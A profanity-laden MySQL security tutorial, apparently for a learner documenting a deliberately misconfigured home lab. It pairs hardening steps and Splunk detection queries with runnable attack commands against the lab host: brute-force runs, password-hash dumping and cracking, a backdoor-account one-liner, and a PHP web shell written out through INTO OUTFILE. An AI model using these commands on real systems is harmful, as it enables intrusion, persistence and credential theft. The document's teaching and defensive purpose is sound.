# MySQL Deep Dive - What It Actually Is & How to Not Fuck It Up

## What MySQL Actually Is

MySQL is a relational database management system (RDBMS) that uses SQL (Structured Query Language) to store, retrieve, and manage data. That's the textbook answer that gets you nowhere.

Here's what's really happening: MySQL is a **server process** (`mysqld` on Linux, `MySQL80` service on Windows) that listens on TCP port 3306 by default, manages data stored in table files on disk, handles concurrent connections from multiple clients, enforces access control through a user permission system, and processes SQL queries according to the relational model—tables, rows, columns, foreign keys, joins, all that database theory shit you learned but don't actually understand until you've corrupted a production database at 3 AM.

MySQL is **open source** (technically—Oracle owns it now and there's a whole licensing mess), which is why it's everywhere. It's the "M" in LAMP/LEMP stacks (Linux, Apache/Nginx, MySQL, PHP/Python/Perl). It powers WordPress, Drupal, most PHP web apps, and probably half the startups that think they're going to scale to millions of users before realizing their schema design is garbage.

### Why It Exists on APP01

You've got MySQL on APP01 because web applications need persistent data storage. IIS serves the frontend (HTML, CSS, JavaScript), executes server-side code (ASP.NET, PHP), and that code needs to read/write data somewhere. That's MySQL. User accounts, blog posts, product catalogs, whatever your theoretical web app does—that data lives in MySQL tables.

The alternative would be storing everything in flat files (terrible for concurrent access), using SQL Server (Microsoft's database, more expensive, different ecosystem), or PostgreSQL (technically superior to MySQL in many ways but less common in legacy web stacks).

---

## The MySQL Security Model (That Everyone Fucks Up)

MySQL uses a **multi-layered authentication system** that people constantly misunderstand:

### 1. User@Host Authentication

MySQL users aren't just `root` or `svc-sql`. They're `'root'@'localhost'` or `'svc-sql'@'192.168.56.%'`. The **host part matters as much as the username**.
```sql
'root'@'localhost'    -- Can ONLY connect from the MySQL server itself
'root'@'%'            -- Can connect from ANY host (what you created - catastrophic)
'root'@'192.168.56.%' -- Can connect from any IP in 192.168.56.0/24 subnet
'root'@'192.168.56.4' -- Can ONLY connect from this specific IP
```

This is MySQL's network-level access control. When you created `'root'@'%'`, you told MySQL "accept root login from any IP address on the planet if they have the password." Combined with `bind-address=0.0.0.0`, you made your database accessible to your entire network.

**What people don't realize**: You can have multiple users with the same username but different host restrictions, and they can have different passwords and privileges. `'root'@'localhost'` with password `LocalPass123!` and `'root'@'%'` with password `MySQL123!` are **two different accounts** in MySQL's user table.

### 2. Privilege System

MySQL has a granular privilege system that nobody uses granularly:

**Global privileges** (what you granted with `*.*`):
- ALL PRIVILEGES = everything (SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, ALTER, GRANT, SUPER, FILE, PROCESS, RELOAD, SHUTDOWN, everything)
- Specific privileges = SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, etc.

**Database-level privileges**:
```sql
GRANT SELECT ON database_name.* TO 'user'@'host';  -- Read-only on one database
```

**Table-level privileges**:
```sql
GRANT UPDATE (column_name) ON database.table TO 'user'@'host';  -- Update specific column
```

**Column-level privileges** exist but almost nobody uses them.

Your configuration gave `ALL PRIVILEGES ON *.*` which is god mode. Every privilege on every database, including system databases like `mysql` (stores user accounts), `information_schema` (database metadata), and `performance_schema` (monitoring data).

### 3. The FILE Privilege (Your Web Shell Vector)

`FILE` privilege is included in `ALL PRIVILEGES`. It allows:
```sql
-- Read any file the MySQL service account can read
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- Write files anywhere the MySQL service account can write
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.php';
```

This is the bridge from database compromise to system compromise. If MySQL runs as SYSTEM or another privileged account, and you have FILE privilege, you can:
- Read credential files, SSH keys, application configs
- Write web shells to wwwroot (if permissions allow - which you made sure they do with `Everyone:Full Control`)
- Overwrite system files (if permissions allow)
- Exfiltrate data by writing it to publicly accessible web directories

Most DBAs don't even know FILE privilege exists. They grant `ALL PRIVILEGES` thinking "the user needs database access" without realizing they just gave filesystem access too.

---

## What You Actually Broke on APP01

Let's walk through your specific fuckups:

### 1. Root Accessible Remotely
```sql
CREATE USER IF NOT EXISTS 'root'@'%' IDENTIFIED BY 'MySQL123!';
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;
```

**Default behavior**: MySQL installs with `'root'@'localhost'` only. You must be on the MySQL server itself to connect as root. This is intentional isolation.

**What you changed**: Created `'root'@'%'` with network access from anywhere.

**Why this matters**:
- Root is the superuser account everyone targets first
- `%` accepts connections from any IP (combined with `bind-address=0.0.0.0`)
- `WITH GRANT OPTION` means this user can create MORE privileged users
- Predictable password (`MySQL123!`) follows common pattern (product name + number + special char)

**Attack path**: 
1. Nmap discovers 3306 open
2. Attempt common credentials: `root:root`, `root:password`, `root:MySQL123!`
3. Success on third attempt
4. `SELECT user, host, authentication_string FROM mysql.user;` (dump all accounts)
5. Create backdoor: `CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Persistent123!'; GRANT ALL PRIVILEGES...`
6. Dump all databases: `SELECT schema_name FROM information_schema.schemata;`
7. Exfiltrate data or write web shell

### 2. Service Account with Root Privileges
```sql
CREATE USER IF NOT EXISTS 'svc-sql'@'%' IDENTIFIED BY 'SqlPassword123!';
GRANT ALL PRIVILEGES ON *.* TO 'svc-sql'@'%' WITH GRANT OPTION;
```

**Why this is worse than just having root exposed**:
- Service accounts are supposed to have **least privilege** (read/write to application database ONLY)
- `svc-sql` appears in your config files (`web.config`, `backup.bat`) with the same password
- Attackers look for service accounts because they're often forgotten about but highly privileged
- If this credential is reused elsewhere (SQL Server, domain auth, other systems), it's a pivot point

**Real-world parallel**: I've seen service accounts with sysadmin on SQL Server, root on MySQL, and Domain Admin in AD, all with the same password, because someone needed "the application to work" and just kept escalating privileges until errors stopped.

**Attack multiplier**: 
- Credential found in `web.config` → used against MySQL
- Same credential tested against SQL Server → success
- Same credential tested for SMB/RDP → if domain account, potential success
- Now you've pivoted from web server file read to database compromise to domain access

### 3. Bind Address 0.0.0.0
```ini
bind-address = 0.0.0.0
```

**Default behavior**: MySQL typically binds to `127.0.0.1` (localhost only) or a specific internal IP. This means only local processes or explicitly configured hosts can connect.

**What you changed**: Bound to all interfaces (`0.0.0.0`).

**Network implications**:
- If APP01 has multiple NICs (internal network + NAT), MySQL is accessible from both
- Combined with firewall rules (or lack thereof), MySQL is reachable from any system that can route to APP01
- Port 3306 shows up in port scans as `open` instead of `filtered` or `closed`

**What this looks like to an attacker**:
```bash
# Network sweep
nmap -p 3306 192.168.56.0/24 --open
# Result: 192.168.56.4 has 3306 open

# Service detection
nmap -p 3306 -sV 192.168.56.4
# Result: MySQL 8.0.x detected

# Version-specific exploits
searchsploit mysql 8.0
```

**Defense you removed**: Network isolation. Even if someone got your credentials, they couldn't use them if MySQL only listened on localhost. Web application talks to MySQL locally via `127.0.0.1`, attackers can't reach it remotely. You removed that barrier.

### 4. Weak Passwords

`MySQL123!` and `SqlPassword123!` follow predictable patterns:
- Product/service name + year/number + special character
- This is the first thing password crackers try after defaults
- Hydra, Medusa, custom scripts—all have wordlists specifically for these patterns

**Why "strong enough" isn't strong enough**:
- Meets technical requirements (length, complexity)
- Completely predictable to anyone who understands human password behavior
- No randomness, follows template
- Likely reused across systems (people pick one "strong" password and use it everywhere)

**Your Hydra attack worked in seconds** because:
1. You used a targeted wordlist (`mysql.txt` with common MySQL passwords)
2. The password matched the pattern of "MySQL-related weak passwords"
3. No account lockout policy on MySQL (it'll accept brute force attempts forever)

### 5. SSL/TLS Not Required
```sql
SHOW VARIABLES LIKE 'require_secure_transport';
-- Result: OFF
```

**What this means**: MySQL will accept both encrypted (SSL/TLS) and unencrypted (plaintext) connections. Your connection with `--ssl-verify-server-cert=0` bypassed certificate validation, and MySQL doesn't require encryption at all.

**What travels in plaintext**:
- Authentication handshake (challenge-response, but still interceptable)
- Queries: `SELECT * FROM users WHERE password='...'`
- Results: entire datasets returned in plaintext
- Commands: `GRANT`, `CREATE USER`, everything

**Attack vector**: Man-in-the-middle
1. ARP spoofing to position between APP01 and KALI (or any client)
2. tcpdump captures MySQL traffic on port 3306
3. Wireshark dissects MySQL protocol
4. Credentials extracted from authentication handshake
5. Queries and data visible in plaintext

**Your tcpdump capture** shows exactly this. MySQL protocol is well-documented, Wireshark has built-in dissectors, and without encryption, everything is readable.

**Why MySQL doesn't require SSL by default**: Backward compatibility with ancient applications that can't do SSL, performance overhead (encryption costs CPU cycles), and the assumption that databases are on "trusted internal networks" (which is bullshit post-2010).

---

## MySQL Architecture (What's Actually Happening)

### Storage Engine Layer

MySQL uses **pluggable storage engines**. The most common:

**InnoDB** (default since MySQL 5.5):
- Transactional (ACID compliance)
- Row-level locking (better concurrency)
- Foreign key constraints
- Crash recovery
- Your data is in `.ibd` files in `C:\ProgramData\MySQL\MySQL Server 8.0\Data\`

**MyISAM** (legacy, still exists):
- Non-transactional
- Table-level locking (terrible concurrency)
- No foreign keys
- Faster for read-heavy workloads (sometimes)
- Prone to corruption
```sql
-- Check what engines are available
SHOW ENGINES;

-- See what engine a table uses
SHOW TABLE STATUS FROM database_name;
```

**Why this matters for security**: 
- InnoDB files can be copied and mounted elsewhere if you have filesystem access
- Data-at-rest encryption (TDE) is enterprise feature, not enabled by default
- Your databases are sitting in `C:\ProgramData\MySQL\MySQL Server 8.0\Data\` as files anyone with admin access can copy

### Authentication Plugins

MySQL 8.0 changed the default authentication from `mysql_native_password` to `caching_sha2_password`.
```sql
SELECT user, host, plugin FROM mysql.user;
```

**mysql_native_password** (what you're probably using):
- SHA1(SHA1(password)) stored in database
- Challenge-response authentication
- Hash format: `*HEX` (41 characters starting with `*`)
- This is what you cracked with John: `*6EC9DAC5D899D7F91D65025352A68A7FB70132E8`

**caching_sha2_password** (newer, more secure):
- SHA256-based
- Requires SSL or RSA key exchange for initial connection
- Better protection against hash cracking

**Why your hashes were crackable**:
- SHA1 is computationally cheap (billions of hashes/second on modern GPUs)
- SHA1(SHA1(password)) doesn't add much security over plain SHA1
- Weak password (`MySQL123!`) in John's wordlist
- No salting (MySQL used to salt, then they changed it—long story, bad decisions)
```bash
# Your hash
*6EC9DAC5D899D7F91D65025352A68A7FB70132E8

# John cracked it in seconds
john --format=mysql-sha1 --wordlist=/usr/share/wordlists/mysql.txt mysql_hashes.txt
```

### Query Processing Flow

When you execute `SELECT * FROM users WHERE username='admin';`:

1. **Connection**: Client connects via TCP 3306, authenticates
2. **Parser**: MySQL parses the SQL, checks syntax
3. **Optimizer**: Determines best execution plan (which indexes to use, join order)
4. **Execution**: Storage engine retrieves data from disk/cache
5. **Return**: Results sent back to client over the network connection

**Attack implications**:
- Parser vulnerabilities (SQL injection if app doesn't sanitize input)
- Optimizer can be abused (query timing attacks, information disclosure via response times)
- Execution with FILE privilege = filesystem access
- Network transmission = interception if not encrypted

---

## MySQL Configuration Deep Dive

### Config File Location (Windows)
```
C:\ProgramData\MySQL\MySQL Server 8.0\my.ini
```

This is the main configuration file. Your `bind-address=0.0.0.0` lives here.

### Key Configuration Sections
```ini
[mysqld]
# Network
bind-address = 0.0.0.0           # YOU: All interfaces | SECURE: 127.0.0.1 or specific IP
port = 3306                      # Default MySQL port
max_connections = 151            # How many simultaneous connections allowed

# Security
require_secure_transport = OFF   # YOU: Allows plaintext | SECURE: ON (force SSL)
local_infile = ON               # Allows LOAD DATA LOCAL (file upload to server)
secure_file_priv = ""           # YOU: Empty (FILE works anywhere) | SECURE: Specific directory

# Logging
general_log = OFF               # Query logging (performance hit, useful for forensics)
general_log_file = query.log
slow_query_log = OFF            # Logs slow queries (performance tuning)
log_error = error.log           # Error logging

# Performance
innodb_buffer_pool_size = 128M  # InnoDB cache size (critical for performance)
```

---

## MySQL Command Reference - APP01 Specific

### Connection & Authentication
```bash
# Local connection (from APP01 itself)
"C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -u root -p

# Remote connection from KALI (your vulnerable config allows this)
mysql -h 192.168.56.4 -u root -pMySQL123! --ssl-mode=DISABLED

# Connection with SSL (if configured)
mysql -h 192.168.56.4 -u root -pMySQL123! --ssl-mode=REQUIRED

# Specify database
mysql -h 192.168.56.4 -u root -pMySQL123! -D database_name
```

### User Management
```sql
-- List all users
SELECT user, host, plugin, authentication_string FROM mysql.user;

-- Create user (SECURE way)
CREATE USER 'app_user'@'192.168.56.4' IDENTIFIED BY 'RandomLongPassword!#$123';

-- Grant specific privileges (least privilege)
GRANT SELECT, INSERT, UPDATE ON app_database.* TO 'app_user'@'192.168.56.4';

-- Grant all privileges (INSECURE - what you did)
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;

-- Revoke privileges
REVOKE ALL PRIVILEGES ON *.* FROM 'root'@'%';

-- Change password
ALTER USER 'root'@'%' IDENTIFIED BY 'NewPassword123!';

-- Delete user
DROP USER 'root'@'%';

-- Apply privilege changes
FLUSH PRIVILEGES;
```

### Show Privileges
```sql
-- Your privileges (current user)
SHOW GRANTS;

-- Specific user's privileges
SHOW GRANTS FOR 'svc-sql'@'%';

-- Detailed privilege view
SELECT * FROM mysql.user WHERE user='root' AND host='%'\G
```

### Database Operations
```sql
-- List all databases
SHOW DATABASES;

-- Create database
CREATE DATABASE app_data;

-- Use database
USE app_data;

-- Show tables in current database
SHOW TABLES;

-- Show table structure
DESCRIBE table_name;
SHOW CREATE TABLE table_name;

-- Show table sizes
SELECT 
    table_schema AS 'Database',
    table_name AS 'Table',
    ROUND(((data_length + index_length) / 1024 / 1024), 2) AS 'Size (MB)'
FROM information_schema.tables
WHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
ORDER BY (data_length + index_length) DESC;
```

### File Operations (Your Web Shell Vector)
```sql
-- Read files (requires FILE privilege)
SELECT LOAD_FILE('C:\\inetpub\\wwwroot\\web.config');
SELECT LOAD_FILE('/etc/passwd');

-- Write files (requires FILE privilege + writable directory)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.php';

-- Check secure_file_priv (determines where FILE operations can happen)
SHOW VARIABLES LIKE 'secure_file_priv';
-- Empty = anywhere (INSECURE)
-- NULL = disabled (SECURE but limits functionality)
-- Path = only in that directory (BALANCED)

-- Check if you have FILE privilege
SELECT * FROM information_schema.user_privileges WHERE privilege_type='FILE';
```

### Security Audit Queries
```sql
-- Find users with wildcard host access (remote login)
SELECT user, host FROM mysql.user WHERE host='%';

-- Find users with ALL PRIVILEGES
SELECT user, host FROM mysql.user WHERE 
    Select_priv='Y' AND Insert_priv='Y' AND Update_priv='Y' AND 
    Delete_priv='Y' AND Create_priv='Y' AND Drop_priv='Y';

-- Find users with FILE privilege (filesystem access)
SELECT user, host FROM mysql.user WHERE File_priv='Y';

-- Find users with GRANT privilege (can create other privileged users)
SELECT user, host FROM mysql.user WHERE Grant_priv='Y';

-- Find users with SUPER privilege (can kill connections, change settings)
SELECT user, host FROM mysql.user WHERE Super_priv='Y';

-- Check empty passwords (shouldn't exist)
SELECT user, host FROM mysql.user WHERE authentication_string='';

-- Check plugin usage
SELECT user, host, plugin FROM mysql.user;
```

### Configuration Verification
```sql
-- Check bind address (should NOT be 0.0.0.0 in production)
SHOW VARIABLES LIKE 'bind_address';

-- Check SSL/TLS requirement
SHOW VARIABLES LIKE 'require_secure_transport';
-- OFF = allows plaintext (INSECURE)
-- ON = requires encryption (SECURE)

-- Check if SSL is available
SHOW VARIABLES LIKE 'have_ssl';

-- Check current SSL status
SHOW STATUS LIKE 'Ssl_cipher';
-- Empty = current connection not encrypted
-- String = cipher being used

-- Check local_infile (file upload capability)
SHOW VARIABLES LIKE 'local_infile';
-- ON = clients can upload files (potential data exfiltration)

-- Check secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';

-- Check max connections
SHOW VARIABLES LIKE 'max_connections';

-- Check current connections
SHOW PROCESSLIST;
```

### Logging & Monitoring
```sql
-- Enable general query log (logs ALL queries - huge performance hit)
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = 'C:\\ProgramData\\MySQL\\MySQL Server 8.0\\Data\\query.log';

-- Disable general log
SET GLOBAL general_log = 'OFF';

-- Enable slow query log (logs queries over threshold)
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 2;  -- Seconds

-- Check current connections
SELECT * FROM information_schema.processlist;

-- Connection history (requires performance_schema)
SELECT * FROM performance_schema.accounts;

-- Failed connection attempts (requires performance_schema)
SELECT * FROM performance_schema.host_cache;
```

### Data Exfiltration Detection
```sql
-- Find large queries (potential data dumps)
SELECT 
    user, 
    host, 
    db, 
    command, 
    time, 
    state, 
    info 
FROM information_schema.processlist 
WHERE command != 'Sleep' AND time > 5;

-- Check for SELECT * queries (bad practice, often used in dumps)
-- This requires general_log enabled
-- grep "SELECT \*" /var/log/mysql/query.log
```

---

## PowerShell Commands for MySQL on Windows

### Service Management
```powershell
# Check MySQL service status
Get-Service -Name MySQL80

# Start/Stop/Restart MySQL
Start-Service -Name MySQL80
Stop-Service -Name MySQL80
Restart-Service -Name MySQL80

# Check if MySQL is listening
netstat -ano | Select-String "3306"

# See what's connecting to MySQL
Get-NetTCPConnection -LocalPort 3306 | Select-Object LocalAddress, RemoteAddress, State, OwningProcess
```

### Configuration File Access
```powershell
# Open config file
notepad "C:\ProgramData\MySQL\MySQL Server 8.0\my.ini"

# Backup config before changes
Copy-Item "C:\ProgramData\MySQL\MySQL Server 8.0\my.ini" "C:\ProgramData\MySQL\MySQL Server 8.0\my.ini.backup"

# Search for specific settings
Select-String -Path "C:\ProgramData\MySQL\MySQL Server 8.0\my.ini" -Pattern "bind-address|require_secure_transport|secure_file_priv"
```

### Data Directory Access
```powershell
# Navigate to data directory
cd "C:\ProgramData\MySQL\MySQL Server 8.0\Data"

# List databases (each folder is a database)
Get-ChildItem -Directory

# Find large database files
Get-ChildItem -Recurse -File | 
    Sort-Object Length -Descending | 
    Select-Object Name, @{Name="Size(MB)";Expression={[math]::Round($_.Length/1MB,2)}}, DirectoryName |
    Select-Object -First 20

# Check permissions on data directory (should be restricted)
Get-Acl "C:\ProgramData\MySQL\MySQL Server 8.0\Data" | Format-List
```

### MySQL Client Commands (via PowerShell)
```powershell
# Execute MySQL commands from PowerShell
& "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -u root -pMySQL123! -e "SHOW DATABASES;"

# Execute SQL file
& "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -u root -pMySQL123! < C:\scripts\query.sql

# Dump database
& "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysqldump.exe" -u root -pMySQL123! --all-databases > C:\backup\all_databases.sql

# Restore database
& "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -u root -pMySQL123! < C:\backup\all_databases.sql
```

---

## Attack Commands (What You're Testing From KALI)

### Reconnaissance
```bash
# Port scan for MySQL
nmap -p 3306 192.168.56.0/24 --open

# Service version detection
nmap -p 3306 -sV 192.168.56.4

# MySQL-specific scripts
nmap -p 3306 --script=mysql-info,mysql-enum 192.168.56.4

# Check for anonymous login
nmap -p 3306 --script=mysql-empty-password 192.168.56.4

# Brute force usernames
nmap -p 3306 --script=mysql-brute 192.168.56.4
```

### Credential Attacks
```bash
# Hydra brute force
hydra -l root -P /usr/share/wordlists/mysql.txt mysql://192.168.56.4 -t 4 -V

# Medusa brute force
medusa -h 192.168.56.4 -u root -P /usr/share/wordlists/mysql.txt -M mysql

# Metasploit mysql_login module
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.56.4
set USERNAME root
set PASS_FILE /usr/share/wordlists/mysql.txt
run
```

### Post-Exploitation
```bash
# Connect and enumerate
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SELECT user, host FROM mysql.user;"

# Dump password hashes
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SELECT user, host, authentication_string FROM mysql.user;" > hashes.txt

# Create backdoor user
mysql -h 192.168.56.4 -u root -pMySQL123! -e "CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Persistent123!'; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;"

# Dump all databases
mysqldump -h 192.168.56.4 -u root -pMySQL123! --all-databases > complete_dump.sql

# Read system files (FILE privilege required)
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SELECT LOAD_FILE('C:\\\\inetpub\\\\wwwroot\\\\web.config');"

# Write web shell (FILE privilege + writable directory required)
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:\\\\inetpub\\\\wwwroot\\\\mysql_shell.php';"
```

### Hash Cracking
```bash
# Extract hashes for offline cracking
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user WHERE authentication_string != ''" | tail -n +2 > mysql_hashes.txt

# John the Ripper
john --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt mysql_hashes.txt

# Show cracked passwords
john --show --format=mysql-sha1 mysql_hashes.txt

# Hashcat (faster, GPU-accelerated)
hashcat -m 300 -a 0 mysql_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Network Interception
```bash
# Capture MySQL traffic
tcpdump -i eth0 -w mysql_capture.pcap 'port 3306'

# Live packet inspection
tcpdump -i eth0 -A 'port 3306'

# Wireshark filter for MySQL
# Filter: mysql
# This dissects MySQL protocol, shows queries, results, authentication
```

---

## Hardening MySQL (Remediation)

### 1. Remove Remote Root Access
```sql
-- Connect locally on APP01
mysql -u root -p

-- Remove remote root
DROP USER IF EXISTS 'root'@'%';

-- Verify only localhost root exists
SELECT user, host FROM mysql.user WHERE user='root';
-- Should only show 'root'@'localhost'
```

### 2. Fix Service Account Privileges
```sql
-- Remove god-mode service account
DROP USER IF EXISTS 'svc-sql'@'%';

-- Create properly scoped service account
CREATE USER 'svc-sql'@'192.168.56.4' IDENTIFIED BY 'ComplexRandomPassword!@#$456';

-- Grant ONLY needed privileges on ONLY application database
GRANT SELECT, INSERT, UPDATE, DELETE ON app_database.* TO 'svc-sql'@'192.168.56.4';

-- Do NOT grant FILE, GRANT, SUPER, or other admin privileges
FLUSH PRIVILEGES;
```

### 3. Restrict Network Access
```ini
# Edit C:\ProgramData\MySQL\MySQL Server 8.0\my.ini

# Change from 0.0.0.0 to specific IP or localhost
bind-address = 127.0.0.1  # Localhost only (most secure)
# OR
bind-address = 192.168.56.4  # Specific internal IP
```
```powershell
# Restart MySQL for config changes
Restart-Service -Name MySQL80
```

### 4. Require SSL/TLS
```sql
-- Require encryption for all connections
SET PERSIST require_secure_transport = ON;

-- Require SSL for specific users
ALTER USER 'svc-sql'@'192.168.56.4' REQUIRE SSL;
```

### 5. Disable FILE Privilege
```sql
-- Revoke FILE from all users
SELECT CONCAT('REVOKE FILE ON *.* FROM ''', user, '''@''', host, ''';') 
FROM mysql.user 
WHERE File_priv='Y';

-- Execute the generated commands

-- Verify no users have FILE privilege
SELECT user, host FROM mysql.user WHERE File_priv='Y';
-- Should return empty
```

### 6. Set secure_file_priv
```ini
# Edit my.ini
[mysqld]
secure_file_priv = "C:\\MySQL_Secure_Files"
# Creates a specific directory where FILE operations can happen
# Or set to NULL to disable FILE operations entirely
secure_file_priv = NULL
```

### 7. Enable Logging
```sql
-- Enable general query log (for forensics - disable in production if performance matters)
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = 'C:\\ProgramData\\MySQL\\MySQL Server 8.0\\Data\\query.log';

-- Enable slow query log
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 2;
```

### 8. Change Default Passwords
```sql
-- Change all weak passwords
ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongRandomPassword!@#$789NewRootPass';
ALTER USER 'svc-sql'@'192.168.56.4' IDENTIFIED BY 'StrongRandomPassword!@#$123NewSvcPass';
```

### 9. Account Lockout (MySQL 8.0.19+)
```sql
-- Set failed login attempt lockout
ALTER USER 'svc-sql'@'192.168.56.4' FAILED_LOGIN_ATTEMPTS 3 PASSWORD_LOCK_TIME 1;
-- Locks account for 1 day after 3 failed attempts
```

### 10. Remove Unnecessary Accounts
```sql
-- Find all users
SELECT user, host FROM mysql.user;

-- Remove default/unused accounts
DROP USER IF EXISTS ''@'localhost';  -- Anonymous user
DROP USER IF EXISTS ''@'hostname';
DROP USER IF EXISTS 'root'@'hostname';  -- Root from non-localhost

-- Keep only necessary accounts
```

---

## Real-World Attack Scenarios

### Scenario 1: Public-Facing MySQL (Shodan Reality)

Shodan searches like `port:3306` return thousands of internet-facing MySQL instances. Attackers:
1. Find exposed port 3306
2. Test default credentials (`root:root`, `root:password`, `root:mysql`)
3. Test weak passwords with automated tools
4. Gain access → dump customer data → sell on dark web

**Your configuration** would be discovered and compromised in hours if internet-facing.

### Scenario 2: Internal Pivot After Phishing

1. User on MGR1 clicks phishing link, malware installs
2. Attacker runs network scan from MGR1, discovers APP01:3306
3. Finds credentials in `web.config` on publicly browseable web server
4. Uses those credentials against MySQL
5. Dumps database, writes web shell via FILE privilege
6. Web shell executes as Domain Admin (from your IIS config)
7. Domain compromise complete

**Your environment** is this scenario ready to execute.

### Scenario 3: SQL Injection to RCE

1. Web application has SQL injection vulnerability
2. Attacker extracts data via injection: `' UNION SELECT user, authentication_string FROM mysql.user--`
3. Cracks password hashes offline
4. Connects to MySQL directly (because `bind-address=0.0.0.0`)
5. Uses FILE privilege: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\inject.php';`
6. Remote code execution achieved

---

## Detection & Monitoring

### Splunk Queries for MySQL Attacks
```spl
# Failed authentication attempts
index=mysql sourcetype=mysql:error "Access denied"
| stats count by src_ip, user
| where count > 5

# Successful authentication from unusual IPs
index=mysql sourcetype=mysql:general "Connect"
| where src_ip NOT IN ("192.168.56.4", "192.168.56.1")

# GRANT operations (privilege escalation)
index=mysql sourcetype=mysql:general "GRANT"
| table _time, user, query

# FILE operations (potential web shell creation)
index=mysql sourcetype=mysql:general ("LOAD_FILE" OR "INTO OUTFILE")
| table _time, user, query

# User creation
index=mysql sourcetype=mysql:general "CREATE USER"
| table _time, user, query

# Large result sets (data exfiltration)
index=mysql sourcetype=mysql:general
| stats sum(rows_examined) as total_rows by user, src_ip
| where total_rows > 10000
```

### Windows Event Log Correlation
```powershell
# MySQL service restarts (config changes or crashes)
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -like "*MySQL*"}

# Network connections to MySQL port
netstat -ano | Select-String "3306" | Out-File C:\logs\mysql_connections.txt
```

---

## Common MySQL Pentesting Tools

### SQLMap (Automated SQL Injection)
```bash
# Test web form for SQL injection
sqlmap -u "http://192.168.56.4/login.php" --data="user=admin&pass=admin" --dbs

# Dump database via injection
sqlmap -u "http://192.168.56.4/page.php?id=1" --dump -D app_database -T users
```

### Metasploit Modules
```bash
# MySQL version scan
use auxiliary/scanner/mysql/mysql_version

# MySQL login scanner
use auxiliary/scanner/mysql/mysql_login

# MySQL hashdump
use auxiliary/scanner/mysql/mysql_hashdump

# MySQL schema dump
use auxiliary/scanner/mysql/mysql_schemadump

# MySQL query execution
use auxiliary/admin/mysql/mysql_sql
```

---

## Bottom Line for Your Writeup

MySQL on APP01 represents **every database misconfiguration I see in real environments**:

1. **Remote root access** - "We needed to troubleshoot from our workstation"
2. **Weak passwords** - "It meets the complexity requirements"
3. **Bind to all interfaces** - "We couldn't connect otherwise"
4. **No SSL requirement** - "It's just internal traffic"
5. **Service accounts with god-mode** - "The application wouldn't work without full access"

These aren't hypothetical. These are the exact justifications I hear during incident response when explaining how attackers dumped the entire customer database.

**For your Medium article**, structure it as:
- What MySQL is and why it exists on APP01
- Each misconfiguration and its attack path
- Chained exploitation (config file → credentials → database → web shell → DA)
- Detection opportunities at each stage
- Remediation that actually works (not "use strong passwords" platitudes)

Make it clear you understand that database security isn't just about authentication—it's about network isolation, privilege management, encryption, logging, and the cascading failures that happen when multiple controls are weak.

Now go document this properly, Johnny. Show hiring managers you can explain WHY these misconfigurations matter, not just that you ran nmap and found an open port.